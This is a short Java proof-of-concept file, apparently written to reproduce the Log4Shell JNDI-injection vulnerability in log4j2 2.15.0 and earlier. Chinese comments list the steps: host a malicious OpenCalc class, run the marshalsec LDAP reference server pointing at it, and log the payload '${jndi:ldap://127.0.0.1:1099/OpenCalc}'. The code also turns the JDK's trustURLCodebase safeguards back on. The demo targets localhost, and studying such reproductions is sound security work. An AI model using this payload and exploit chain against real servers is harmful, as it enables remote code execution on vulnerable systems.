package xyz.lazyrabbit.log4j2.cve;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author guoxw
 * @Description TODO
 * @createTime 2021年12月28日 15:47:00
 */
public class CveDemo {

    static Logger logger = LogManager.getLogger(CveDemo.class);

    /**
     * 复现步骤
     * <p>
     * 1、编译恶意代码OpenCalc.java，将class文件放到服务器上，提供一个下载链接，如：http://127.0.0.1:18080/file/OpenCalc.class
     * 2、搭建LDAP服务，可以使用开源的程序搭建：https://github.com/mbechler/marshalsec
     * 1）克隆代码
     * 2）maven打包：mvn clean package -DskipTests
     * 3）执行：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:18080/file/#OpenCalc 1099
     * 3、引入log4j2 2.15.0以及之前的版本，执行本方法
     *
     * @param args
     */
    public static void main(String[] args) {
        // 如果使用低版本的 jdk，trustURLCodebase 默认就是 true，存在 JNDI 注入漏洞。而后来 Java 修复了该漏洞，将参数默认值设置为 false：
        // JDK 6u141、7u131、8u121 之后：增加了 com.sun.jndi.rmi.object.trustURLCodebase 选项，默认为 false，禁止 RMI 和 CORBA 协议使用远程 codebase 的选项，因此 RMI 和 CORBA 在以上的 JDK 版本上已经无法触发该漏洞，但依然可以通过指定 URI 为 LDAP 协议来进行 JNDI 注入攻击。
        // JDK 6u211、7u201、8u191之后：增加了 com.sun.jndi.ldap.object.trustURLCodebase 选项，默认为 false，禁止 LDAP 协议使用远程 codebase 的选项，把 LDAP 协议的攻击途径也给禁了。
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

        logger.info("${jndi:ldap://127.0.0.1:1099/OpenCalc}");
    }
}
